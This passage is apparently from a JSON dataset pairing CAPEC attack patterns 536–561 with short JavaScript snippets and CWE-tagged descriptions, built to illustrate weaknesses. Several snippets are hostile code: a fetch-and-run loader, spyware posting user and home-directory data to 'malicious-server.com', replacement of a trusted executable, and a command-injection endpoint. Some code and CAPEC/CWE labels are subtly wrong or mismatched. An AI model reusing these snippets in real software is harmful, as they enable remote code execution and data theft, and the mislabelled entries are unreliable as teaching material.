        "code_snippet": "const fs = require('fs');\nconst configFilePath = '/etc/app/config.json';\n\n// CWE-284: Improper Access Control\nif (fs.existsSync(configFilePath)) {\n  const configData = fs.readFileSync(configFilePath, 'utf8');\n  let config;\n  try {\n    config = JSON.parse(configData);\n  } catch (e) {\n    console.error('Invalid JSON format in config file');\n    process.exit(1);\n  }\n\n  // CWE-99: Improper Control of Resource Identifiers\n  const resourcePath = config.resourcePath;\n  if (resourcePath) {\n    // CWE-377: Insecure Temporary File\n    const tempFilePath = `/tmp/${resourcePath}`;\n    fs.writeFileSync(tempFilePath, 'Temporary data');\n    console.log(`Temporary file created at ${tempFilePath}`);\n  }\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const sensitiveData = config.sensitiveData;\n  if (sensitiveData) {\n    console.log(`Sending sensitive data: ${sensitiveData}`);\n  }\n} else {\n  console.error('Configuration file not found');\n  process.exit(1);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could inject malicious data into a configuration file, leading to various vulnerabilities. The code reads a configuration file (`/etc/app/config.json`) without proper access control (CWE-284), parses it, and uses its contents to create a temporary file in an insecure manner (CWE-377). It also improperly handles resource identifiers (CWE-99) and logs sensitive data (CWE-201). This represents the CAPEC idea of an attacker injecting malicious data during configuration, causing the system to perform suboptimally or leak sensitive information."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode(filePath) {\n  const maliciousCode = `\n    // Malicious code injected\n    console.log('Sensitive data exfiltrated');\n  `;\n  fs.appendFileSync(filePath, maliciousCode);\n}\n\n// CWE-497: Exposure of Sensitive System Information\nfunction exposeSensitiveInfo() {\n  const sensitiveInfo = 'System credentials: admin:password123';\n  console.log(sensitiveInfo);\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nfunction useNonUpdateableComponent() {\n  const nonUpdateableComponent = require('legacy-component');\n  nonUpdateableComponent.run();\n}\n\n// Simulate infiltration of hardware development environment\nfunction infiltrateDevelopmentEnvironment() {\n  const firmwareFilePath = './firmware.js';\n  injectMaliciousCode(firmwareFilePath);\n  exposeSensitiveInfo();\n  useNonUpdateableComponent();\n}\n\ninfiltrateDevelopmentEnvironment();",
        "description": "This JavaScript code snippet simulates the infiltration of a hardware development environment by an adversary. The `injectMaliciousCode` function represents CWE-506 by appending malicious code to a firmware file. The `exposeSensitiveInfo` function demonstrates CWE-497 by logging sensitive system information to the console. The `useNonUpdateableComponent` function illustrates CWE-1329 by using a legacy component that cannot be updated. The `infiltrateDevelopmentEnvironment` function ties these actions together, representing the main idea of CAPEC-463, where an adversary manipulates the development environment to compromise hardware components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Downloading a library without integrity check (CWE-494)\nhttps.get('https://example.com/malicious-library.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // Including functionality from an untrusted source (CWE-829)\n    fs.writeFileSync('malicious-library.js', data);\n    require('./malicious-library.js');\n  });\n});\n\n// Simulating the use of a vulnerable third-party component (CWE-1395)\nconst vulnerableComponent = require('vulnerable-component');\nvulnerableComponent.execute();\n\n// Embedded malicious code (CWE-506)\nfunction maliciousFunction() {\n  console.log('Executing malicious code');\n  // Replicating malicious code (CWE-509)\n  https.get('https://example.com/replicate', (res) => {\n    res.on('data', () => {});\n  });\n}\n\nmaliciousFunction();",
        "description": "This JavaScript code snippet demonstrates several security weaknesses related to the CAPEC 'Open-Source Library Manipulation'. The code downloads a library from a remote location without verifying its integrity (CWE-494) and includes it in the project (CWE-829). It also simulates the use of a vulnerable third-party component (CWE-1395). Additionally, it contains embedded malicious code (CWE-506) that logs a message and attempts to replicate itself by making another network request (CWE-509). This snippet highlights the risks of incorporating untrusted and potentially malicious open-source libraries into software projects."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "function processSensitiveData(data) {\n  // CWE-506: Embedded Malicious Code\n  if (data.includes('sensitive')) {\n    // Malicious functionality: log sensitive data\n    console.log('Sensitive data accessed:', data);\n  }\n\n  // CWE-497: Exposure of Sensitive System Information\n  if (data.includes('systemInfo')) {\n    // Expose system information to unauthorized control sphere\n    return 'System Info: ' + JSON.stringify(systemInfo);\n  }\n\n  // CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\n  if (debugMode) {\n    console.debug('Debugging data:', data);\n  }\n\n  // CWE-1294: Insecure Security Identifier Mechanism\n  if (!isValidSecurityIdentifier(data.securityIdentifier)) {\n    console.warn('Invalid Security Identifier detected');\n  }\n\n  // CWE-1259: Improper Restriction of Security Token Assignment\n  if (!isValidSecurityToken(data.securityToken)) {\n    console.warn('Improper Security Token detected');\n  }\n\n  // Process data normally\n  return processData(data);\n}\n\nfunction isValidSecurityIdentifier(identifier) {\n  // Placeholder for security identifier validation logic\n  return identifier === 'validIdentifier';\n}\n\nfunction isValidSecurityToken(token) {\n  // Placeholder for security token validation logic\n  return token === 'validToken';\n}\n\nfunction processData(data) {\n  // Placeholder for normal data processing logic\n  return 'Processed Data: ' + data;\n}\n\nconst systemInfo = { os: 'Linux', version: '5.4.0' };\nconst debugMode = true;",
        "description": "This JavaScript code snippet demonstrates the concept of embedding malicious functionality into a system, as described in the CAPEC. The function `processSensitiveData` includes several vulnerabilities: logging sensitive data (CWE-506), exposing system information (CWE-497), outputting debug information (CWE-11), and improperly validating security identifiers and tokens (CWE-1294 and CWE-1259). These vulnerabilities can be exploited by an attacker with access to the development environment to disrupt or further compromise the system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readBuffer(buffer, index) {\n  if (index < 0 || index >= buffer.length) {\n    console.log('Index out of bounds!');\n    return;\n  }\n  return buffer[index];\n}\n\nconst buffer = [1, 2, 3, 4, 5];\nconst index = 10; // Out-of-bounds index\nconst value = readBuffer(buffer, index);\nconsole.log('Value:', value);",
        "description": "This JavaScript code snippet demonstrates an 'Overread Buffers' vulnerability. The function `readBuffer` attempts to read a value from a buffer array at a specified index. If the index is out of the buffer's bounds (either negative or greater than the buffer's length), it logs an 'Index out of bounds!' message and returns without reading the buffer. However, the code still allows for the possibility of an out-of-bounds read if the index check is bypassed or improperly handled. The example sets an out-of-bounds index (10) to illustrate the potential vulnerability. This code represents the main idea of CAPEC-129 and related CWEs, such as CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read), by showing how improper handling of buffer boundaries can lead to reading invalid memory locations."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  let responseMessage = 'Hello, World!';\n\n  if (userAgent.includes('Mozilla')) {\n    responseMessage = 'Hello, Mozilla user!';\n  } else if (userAgent.includes('Chrome')) {\n    responseMessage = 'Hello, Chrome user!';\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(responseMessage);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server that responds differently based on the 'User-Agent' header in the incoming request. The server checks if the 'User-Agent' contains 'Mozilla' or 'Chrome' and sends a different response message accordingly. This behavior can be exploited for application fingerprinting (CAPEC-170) as it reveals information about the internal state of the application based on observable response discrepancies (CWE-204). An attacker can use this information to determine the type or version of the application installed on the remote target."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Trojan Horse: Function appears benign but contains hidden malicious code\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        // Embedded Malicious Code: Execute hidden malicious payload\n        fs.appendFileSync(dest, '\\nconsole.log(\"Malicious code executed\");');\n        require(dest); // Execute the downloaded file\n      });\n    });\n  });\n}\n\ndownloadFile('http://example.com/benign-script.js', 'downloaded-script.js');\n\n// Spyware: Collect and send sensitive information\nfunction collectSensitiveInfo() {\n  const sensitiveInfo = {\n    user: process.env.USER,\n    homeDir: process.env.HOME\n  };\n  http.request({\n    hostname: 'malicious-server.com',\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  }, (res) => {\n    res.on('data', (chunk) => {});\n  }).write(JSON.stringify(sensitiveInfo));\n}\n\ncollectSensitiveInfo();",
        "description": "This JavaScript code snippet demonstrates a targeted malware attack by combining several CWE weaknesses. The `downloadFile` function appears to be a benign utility to download a file from a URL, but it contains hidden malicious code (CWE-507: Trojan Horse) that appends and executes a malicious payload (CWE-506: Embedded Malicious Code). Additionally, the `collectSensitiveInfo` function collects sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere) and sends it to a malicious server (CWE-512: Spyware). This code embodies the main idea of CAPEC-Targeted Malware by exploiting known vulnerabilities in the environment to achieve negative technical impacts."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to the counterfeit site!</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and checks if a 'redirect' query parameter is present in the URL. If the 'redirect' parameter is found, the server performs an open redirect to the specified URL (CWE-601). If not, it serves a basic HTML page that could be a counterfeit version of a legitimate site. This counterfeit site can be used to gather user information or serve malicious content (CAPEC-509, CAPEC-506). The code demonstrates how an attacker might create a counterfeit website and use open redirects to facilitate phishing attacks."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "const https = require('https');\n\nfunction fetchData(url) {\n  const options = {\n    hostname: 'fake-supplier.com',\n    port: 443,\n    path: '/data',\n    method: 'GET',\n    rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n  };\n\n  const req = https.request(options, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      console.log('Received data:', data);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\nfetchData('https://fake-supplier.com/data');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches data from a counterfeit organization, 'fake-supplier.com', which appears to be a legitimate supplier. The code includes a critical vulnerability (CWE-295: Improper Certificate Validation) by setting 'rejectUnauthorized' to false, allowing the acceptance of any SSL/TLS certificate without proper validation. This can lead to the injection of corrupted or malicious components into the supply chain. The code represents the main idea of the CAPEC by showing how an adversary can exploit improper certificate validation to introduce malicious components into an organization's supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "const fs = require('fs');\nconst sensitiveFilePath = '/path/to/sensitive/file';\n\n// Function to read sensitive data from a file\nfunction readSensitiveData() {\n  try {\n    const data = fs.readFileSync(sensitiveFilePath, 'utf8');\n    console.log('Sensitive Data:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Simulate a debug mode transition without clearing sensitive data\nfunction enterDebugMode() {\n  console.log('Entering debug mode...');\n  // Sensitive data is not cleared\n  readSensitiveData();\n}\n\n// Simulate a power state transition without clearing sensitive data\nfunction powerStateTransition() {\n  console.log('Transitioning power state...');\n  // Sensitive data is not cleared\n  readSensitiveData();\n}\n\n// Main function to demonstrate the vulnerability\nfunction main() {\n  readSensitiveData();\n  enterDebugMode();\n  powerStateTransition();\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is read from a file and then accessed during debug and power state transitions without being properly cleared. The `readSensitiveData` function reads and logs sensitive data from a specified file. The `enterDebugMode` and `powerStateTransition` functions simulate transitions to debug mode and power state changes, respectively, without clearing the sensitive data. This embodies the main idea of the CAPEC 'Pull Data from System Resources' by showing how an adversary can gather useful information from system resources. The related CWEs are represented by the lack of proper data clearing during state transitions, exposing sensitive information."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "const fs = require('fs');\n\n// Simulate tenant data storage\nlet tenantData = {\n  tenantId: 'tenant123',\n  sensitiveInfo: 'password123'\n};\n\n// Function to delete tenant data\nfunction deleteTenantData(tenantId) {\n  // Incomplete data deletion\n  if (tenantData.tenantId === tenantId) {\n    delete tenantData.tenantId;\n    // Improper scrubbing of sensitive data\n    // tenantData.sensitiveInfo is not deleted\n  }\n}\n\n// Simulate tenant data deletion\ndeleteTenantData('tenant123');\n\n// New tenant allocation\nlet newTenantData = tenantData;\n\n// New tenant can access old tenant's sensitive information\nconsole.log(newTenantData.sensitiveInfo); // Outputs: 'password123'",
        "description": "This JavaScript code snippet demonstrates an incomplete data deletion scenario in a multi-tenant environment. The `deleteTenantData` function is intended to delete a tenant's data but fails to remove sensitive information (`sensitiveInfo`). When a new tenant is allocated the same storage, they can access the previous tenant's sensitive information. This example embodies the CAPEC of 'Incomplete Data Deletion in a Multi-Tenant Environment' and highlights related CWEs such as 'Improper Scrubbing of Sensitive Data from Decommissioned Device' and 'Improper Removal of Sensitive Information Before Storage or Transfer'."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device {\n  constructor(name) {\n    this.name = name;\n  }\n\n  selfDestruct() {\n    console.log(`${this.name} is self-destructing...`);\n    delete this;\n  }\n}\n\nclass SecureDevice extends Device {\n  constructor(name) {\n    super(name);\n  }\n\n  // Missing virtual destructor\n  secureMethod() {\n    console.log('Performing secure operation...');\n  }\n}\n\n// Simulate physical destruction\nlet device = new SecureDevice('SensitiveDevice');\ndevice.selfDestruct();\n\n// Attempt to access the device after destruction\ntry {\n  device.secureMethod();\n} catch (e) {\n  console.log('Error: Device is no longer functional.');\n}",
        "description": "This JavaScript code snippet defines a `Device` class with a `selfDestruct` method that deletes the instance, simulating physical destruction. The `SecureDevice` class extends `Device` and includes a `secureMethod` but lacks a virtual destructor, representing CWE-1087. The `selfDestruct` method embodies CWE-1082 by allowing the device to destroy itself. The code attempts to access the device after calling `selfDestruct`, demonstrating the device's non-functionality post-destruction, aligning with the CAPEC's main idea of physical destruction of a device or component."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "const sensitiveData = 'TopSecretInformation';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfetch('http://example.com/api', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({ data: sensitiveData })\n})\n.then(response => response.json())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));\n\n// CWE-922: Insecure Storage of Sensitive Information\nlocalStorage.setItem('sensitiveData', sensitiveData);\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nlet reusedData = sensitiveData;\nreusedData = null; // Sensitive data not properly cleared before reuse\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nconst logSensitiveData = (data) => {\n  console.log('Logging data:', data); // Sensitive data logged without removal\n};\nlogSensitiveData(sensitiveData);\n\n// CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\nconst privateResource = { secret: sensitiveData };\nconst untrustedFunction = (resource) => {\n  console.log('Untrusted function received:', resource);\n};\nuntrustedFunction(privateResource);",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive data in cleartext (CWE-319), stores sensitive data insecurely in localStorage (CWE-922), fails to properly clear sensitive data before reuse (CWE-226), logs sensitive data without removing it (CWE-212), and leaks private resources to an untrusted function (CWE-402). These actions can lead to contamination of organizational information systems by handling unauthorized sensitive information, potentially causing data spills and system downtime."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious.js', (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    fs.writeFile('malicious.js', data, (err) => {\n      if (err) throw err;\n      console.log('Malicious code downloaded and saved!');\n      require('./malicious.js');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the file:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a script downloads and executes code from an untrusted remote source without performing any integrity checks. The code uses the 'http' module to fetch a JavaScript file from a remote server and saves it locally using the 'fs' module. After saving the file, it immediately requires and executes the downloaded script. This embodies the CAPEC 'Local Execution of Code' by showing how an adversary could install and execute malicious code on a target system. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded code's origin and integrity, and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is demonstrated by including and executing the downloaded script from an untrusted source."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable code: Installing a new service with default credentials and improper access control\nconst serviceName = 'MyService';\nconst servicePath = 'C:\\path\\to\\service.exe';\nconst defaultCredentials = 'admin:password'; // CWE-1392: Use of Default Credentials\n\n// CWE-284: Improper Access Control\nexec(`sc create ${serviceName} binPath= ${servicePath} start= auto`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error creating service: ${error.message}`);\n    return;\n  }\n  console.log(`Service ${serviceName} created successfully.`);\n\n  // CWE-1188: Initialization of a Resource with an Insecure Default\n  exec(`sc config ${serviceName} obj= ${defaultCredentials}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error configuring service: ${error.message}`);\n      return;\n    }\n    console.log(`Service ${serviceName} configured with default credentials.`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates the creation and configuration of a new service on a Windows system using Node.js. The code uses the 'child_process' module to execute system commands. It creates a new service named 'MyService' and sets it to start automatically. The service is then configured with default credentials ('admin:password'). This snippet embodies the CAPEC 'Install New Service' by showing how an adversary might install a new service that runs with elevated privileges at startup. The code also highlights several related CWEs: CWE-284 (Improper Access Control) by not restricting access to the service creation command, CWE-1392 (Use of Default Credentials) by using insecure default credentials, and CWE-1188 (Initialization of a Resource with an Insecure Default) by setting insecure defaults for the service configuration."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmod('/etc/systemd/system/my-service.service', 0o777, (err) => {\n  if (err) throw err;\n  console.log('Permissions changed to 777');\n\n  // CWE-15: External Control of System or Configuration Setting\n  exec('systemctl restart my-service', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability by modifying an existing service configuration and restarting it. The code changes the permissions of a systemd service file to 777 (CWE-284: Improper Access Control), allowing any user to modify it. Then, it restarts the service using an external command (CWE-15: External Control of System or Configuration Setting). This can lead to unauthorized modifications and potential security risks, embodying the main idea of the CAPEC 'Modify Existing Service'."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\nhttp.createServer((req, res) => {\n  if (req.url === '/install') {\n    const userInput = req.headers['x-malicious-input'];\n    exec(`echo ${userInput} >> /etc/sensitive_info`, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n    fs.writeFile('/usr/local/bin/malicious_script.sh', '#!/bin/bash\\necho \"Malicious code executed\"', (err) => {\n      if (err) throw err;\n      console.log('Malicious script installed');\n    });\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Rootkit installed');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for requests on port 8080. When a request is made to the '/install' endpoint, it takes user input from the 'x-malicious-input' header and executes a command to append this input to a sensitive system file ('/etc/sensitive_info'). Additionally, it writes a malicious script to '/usr/local/bin/malicious_script.sh'. This code demonstrates several vulnerabilities: improper access control (CWE-284), embedded malicious code (CWE-506), a trojan horse (CWE-507), exposure of sensitive system information (CWE-497), and OS command injection (CWE-78). The main idea is to show how an attacker can exploit these weaknesses to install a rootkit that alters system functionality and hides its presence."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "const isAdmin = false;\n\nfunction checkAdmin() {\n  if (isAdmin) {\n    console.log('Access granted to admin functionality.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Bypassing client-side check\nisAdmin = true;\ncheckAdmin();",
        "description": "This JavaScript code snippet demonstrates a functionality bypass vulnerability. The `isAdmin` variable is used to control access to admin functionality. The `checkAdmin` function checks this variable to determine if access should be granted. However, since the `isAdmin` variable is client-side and can be modified by an attacker, the protection mechanism can be easily bypassed. This represents CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-693 (Protection Mechanism Failure), as the client-side check is insufficient to protect the server-side functionality."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst users = {\n  'admin': 'password123' // CWE-521: Weak Password Requirements\n};\n\nhttp.createServer((req, res) => {\n  const auth = req.headers['authorization'];\n  if (!auth) {\n    res.writeHead(401, {'WWW-Authenticate': 'Basic realm=\"Secure Area\"'});\n    return res.end('Authorization required');\n  }\n\n  const [scheme, encoded] = auth.split(' ');\n  if (scheme !== 'Basic') {\n    res.writeHead(400);\n    return res.end('Invalid authentication scheme');\n  }\n\n  const [username, password] = Buffer.from(encoded, 'base64').toString().split(':');\n  if (users[username] && users[username] === password) {\n    res.writeHead(200);\n    return res.end('Access granted');\n  }\n\n  res.writeHead(403);\n  res.end('Access denied');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a basic HTTP server that uses Basic Authentication to protect access to a resource. The server checks the 'Authorization' header for credentials, decodes them, and verifies them against a hardcoded user list. This example embodies several vulnerabilities: CWE-521 (Weak Password Requirements) by using a weak password ('password123'), CWE-308 (Use of Single-factor Authentication) by relying solely on Basic Authentication, and CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in an insecure manner (Base64 encoding). The code represents the main idea of the CAPEC by demonstrating how an attacker could use stolen credentials to gain unauthorized access to a system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to change file extension handler\nfunction replaceFileExtensionHandler(extension, newHandlerPath) {\n  const handlersFilePath = path.join(__dirname, 'fileHandlers.json');\n  let handlers;\n\n  // Read the current file handlers\n  try {\n    handlers = JSON.parse(fs.readFileSync(handlersFilePath, 'utf8'));\n  } catch (err) {\n    console.error('Error reading file handlers:', err);\n    return;\n  }\n\n  // Replace the handler for the given extension\n  handlers[extension] = newHandlerPath;\n\n  // Write the updated handlers back to the file\n  try {\n    fs.writeFileSync(handlersFilePath, JSON.stringify(handlers, null, 2), 'utf8');\n    console.log(`Handler for .${extension} files updated to ${newHandlerPath}`);\n  } catch (err) {\n    console.error('Error writing file handlers:', err);\n  }\n}\n\n// Example usage\nreplaceFileExtensionHandler('txt', '/path/to/malicious/program');",
        "description": "This JavaScript code snippet demonstrates how an application might replace the file extension handler for a specific file type. The `replaceFileExtensionHandler` function reads a JSON file containing file handlers, updates the handler for a given file extension, and writes the changes back to the file. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an attacker could modify the file handler for a specific extension to point to an arbitrary (potentially malicious) program. The related CWEs are represented by the potential vulnerabilities in reading and writing file paths and handlers, such as CWE-284 (Improper Access Control), CWE-646 (Reliance on File Name or Extension), and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "const fs = require('fs');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/file', 'utf8', function(err, data) {\n  if (err) {\n    return console.log(err);\n  }\n  console.log(data);\n});\n\n// Schedule a task to run at a specific time\nsetTimeout(function() {\n  console.log('Scheduled task running...');\n  // Simulate modifying stored data without proper protection\n  fs.writeFile('/path/to/file', 'New data', function(err) {\n    if (err) {\n      return console.log(err);\n    }\n    console.log('Data written successfully');\n  });\n}, 10000); // Run after 10 seconds",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC 'Schedule Software To Run' by scheduling a task to run after a delay using `setTimeout`. The code also uses the deprecated `fs.readFile` function to read a file, which aligns with CWE-477 (Use of Obsolete Function). Additionally, it simulates modifying stored data without proper protection, which relates to CWE-217 (Failure to Protect Stored Data from Modification). The code highlights the risks of using outdated functions and scheduling tasks that may lead to vulnerabilities in data handling."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmodSync('/path/to/trusted/executable', '777');\n\n// Replace the trusted executable with a malicious one\nfs.writeFileSync('/path/to/trusted/executable', '#!/bin/bash\\necho \"Malicious code executed\"\\n');\n\n// CWE-78: OS Command Injection\nexec('/path/to/trusted/executable', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious version. The `chmodSync` function is used to change the permissions of the trusted executable, making it writable by anyone. The `writeFileSync` function then replaces the trusted executable with a malicious script. Finally, the `exec` function is used to execute the replaced executable, demonstrating how an attacker can inject and execute malicious commands (CWE-78). This embodies the main idea of the CAPEC 'Replace Trusted Executable' by showing how an attacker can exploit weaknesses in privilege management and access control to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "const net = require('net');\n\nconst rogueStation = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    console.log('Received data from satellite:', data.toString());\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    const tamperedData = data.toString().replace('original', 'tampered');\n    socket.write(tamperedData);\n  });\n});\n\nrogueStation.listen(8080, '0.0.0.0', () => {\n  console.log('Rogue uplink station is active on port 8080');\n});",
        "description": "This JavaScript code snippet simulates a rogue uplink station that disrupts satellite communications, embodying the main idea of the 'Orbital Jamming' CAPEC. The rogue station listens for incoming data on port 8080. When data is received, it logs the data (CWE-940: Improper Verification of Source of a Communication Channel) and then modifies the data (CWE-924: Improper Enforcement of Message Integrity During Transmission) before sending it back. This represents the attack pattern where an adversary sends disruptive signals to a satellite, preventing intended transmissions."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = {\n  'admin': 'password123', // CWE-522: Insufficiently Protected Credentials\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic Express server with a login endpoint. It uses a hardcoded username and password for authentication, which embodies the main idea of CAPEC-Use of Known Domain Credentials. The code is vulnerable to several weaknesses: CWE-522 (Insufficiently Protected Credentials) as the credentials are stored in plaintext, CWE-307 (Improper Restriction of Excessive Authentication Attempts) as there is no mechanism to limit failed login attempts, CWE-308 (Use of Single-factor Authentication) as it relies solely on a password for authentication, and CWE-309 (Use of Password System for Primary Authentication) as it uses a simple password system. This example demonstrates how an adversary could exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\nconst adminCredentials = { username: 'admin', password: 'password123' }; // CWE-521: Weak Password Requirements\n\nconst client = new net.Socket();\nclient.connect(445, '192.168.1.100', () => {\n  console.log('Connected to Windows Admin Share');\n  client.write(JSON.stringify(adminCredentials)); // CWE-522: Insufficiently Protected Credentials\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-308: Use of Single-factor Authentication\n// CWE-309: Use of Password System for Primary Authentication\n// CWE-294: Authentication Bypass by Capture-replay\n// CWE-263: Password Aging with Long Expiration\n// CWE-262: Not Using Password Aging",
